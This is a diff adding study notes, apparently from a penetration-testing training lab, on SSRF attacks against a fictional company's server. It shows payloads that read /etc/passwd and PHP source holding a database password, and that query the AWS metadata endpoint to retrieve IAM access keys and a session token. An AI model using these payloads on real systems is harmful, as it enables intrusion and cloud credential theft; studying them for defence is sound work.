@@ -123,6 +123,7 @@ Additional relevant Meterpreter commands:
 - hashdump: retrieve passwords
 
 Analyze Metasploit attacks with DeepBlueCLI.
+
 ## 4.2 BeEF
 
 BeEF: tool for exploiting browsers and conducting client-side social engineering attacks.
@@ -287,3 +288,64 @@ Sample SQLMap results:
 
 ## 4.7 Cloud SSRF and IMDS Attack
 
+### General SSRF
+
+```bash
+# first submission, we use a valid jpg file
+# then, we go back and put file:///etc/passwd as the url for the server to retrieve.
+# When we perform a GET request for the 'image', we get the /etc/passwd file.
+sec504@slingshot:~/labs/www$ curl http://intern.falsimentis.com/images/mike.jpg
+
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+...
+# We don't get results for /etc/shadow due to permissions, but when we get the src for index.html...
+<?php
+define('DB_NAME', 'intern');
+define('DB_USER', 'intern');
+define('DB_PASSWORD', 'geDgECURnQjuymuGKHoC');
+?>
+```
+
+### Cloud IMDS Access
+
+This time, we request the IMDS server:
+
+```text
+# what we put in the vulnerable field:
+http://169.254.169.254/latest/meta-data/iam/info
+
+# results of our curl request
+{
+	"Code": "Success",
+	"LastUpdated": "2021-05-02T18:50:40Z",
+	"InstanceProfileArn": "arn:aws:iam::896453262835:instance-profile/falsimentis-deploy-role",
+	"InstanceProfileId": "AIPA5BOGHHXZELSK34VU4"
+}
+
+# For the falsimentis-deploy-role, we try to get the creds:
+http://169.254.169.254/latest/meta-data/iam/security-credentials/falsimentis-deploy-role/
+
+# Results:
+{
+	"Code": "Success",
+	"LastUpdated": "2021-05-02T18:50:40Z",
+	"Type": "AWS-HMAC",
+	"AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
+	"SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
+	"Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
+	"Expiration": "2026-05-02T18:50:40Z"
+}
+```
